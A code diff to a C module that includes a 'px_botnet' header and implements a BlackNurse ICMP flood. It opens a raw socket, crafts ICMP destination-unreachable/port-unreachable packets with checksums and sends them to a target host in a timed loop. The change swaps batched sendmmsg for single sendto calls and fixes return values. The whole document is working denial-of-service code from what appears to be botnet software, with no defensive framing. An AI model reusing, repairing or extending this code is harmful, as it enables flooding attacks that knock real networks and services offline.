@@ -1,5 +1,6 @@
 #include "../../includes/px_botnet.h"
 
+
 #define MAX_PACKETS 100
 
 struct arginfo {
@@ -29,47 +30,38 @@ void *SEND_BLACKNURSE(void *arg) {
     int s, i;
     struct addrinfo hints, *res;
     struct sockaddr_in *sin;
-    struct mmsghdr msgs[MAX_PACKETS] = {0};
-    struct iovec iovecs[MAX_PACKETS];
-    char packets[MAX_PACKETS][60];
+    char packet[60] = {0};
     time_t start_time, curr_time;
 
     memset(&hints, 0, sizeof hints);
     hints.ai_family = AF_INET;
     if (getaddrinfo(info->host, NULL, &hints, &res) != 0) {
         perror("getaddrinfo");
-        return;
+        return NULL;
     }
 
     s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (s == -1) {
         perror("socket");
         freeaddrinfo(res);
-        return;
+        return NULL;
     }
 
+    sin = (struct sockaddr_in *)res->ai_addr;
 
-    for (i = 0; i < MAX_PACKETS; i++) {
-        memset(packets[i], 0, 60);
-        packets[i][20] = 0x03; // ICMP type = Destination Unreachable
-        packets[i][21] = 0x03; // ICMP code = Port Unreachable
-        // Calculate the checksum
-        unsigned short *icmp_ptr = (unsigned short *)(packets[i] + 20);
-        icmp_ptr[1] = 0; // Clear the checksum field
-        unsigned short checksum = calculate_checksum(icmp_ptr, 40);
-        icmp_ptr[1] = checksum; // Set the checksum field
-        iovecs[i].iov_base = packets[i];
-        iovecs[i].iov_len = 60;
-        msgs[i].msg_hdr.msg_iov = &iovecs[i];
-        msgs[i].msg_hdr.msg_iovlen = 1;
-        msgs[i].msg_hdr.msg_name = res->ai_addr;
-        msgs[i].msg_hdr.msg_namelen = res->ai_addrlen;
-    }
+    memset(packet, 0, 60);
+    packet[20] = 0x03; // ICMP type = Destination Unreachable
+    packet[21] = 0x03; // ICMP code = Port Unreachable
+    // Calculate the checksum
+    unsigned short *icmp_ptr = (unsigned short *)(packet + 20);
+    icmp_ptr[1] = 0; // Clear the checksum field
+    unsigned short checksum = calculate_checksum(icmp_ptr, 40);
+    icmp_ptr[1] = checksum; // Set the checksum field
 
     start_time = time(NULL);
     while (true) {
-        if (sendmmsg(s, msgs, MAX_PACKETS, 0) == -1) {
-            perror("sendmmsg");
+        if (sendto(s, packet, 60, 0, (struct sockaddr *)sin, sizeof(struct sockaddr_in)) == -1) {
+            perror("sendto");
             break;
         }
 
@@ -82,7 +74,7 @@ void *SEND_BLACKNURSE(void *arg) {
 
     close(s);
     freeaddrinfo(res);
-    return;
+    return NULL;
 }
 
 void BLACKNURSE(unsigned char *host, int seconds) {
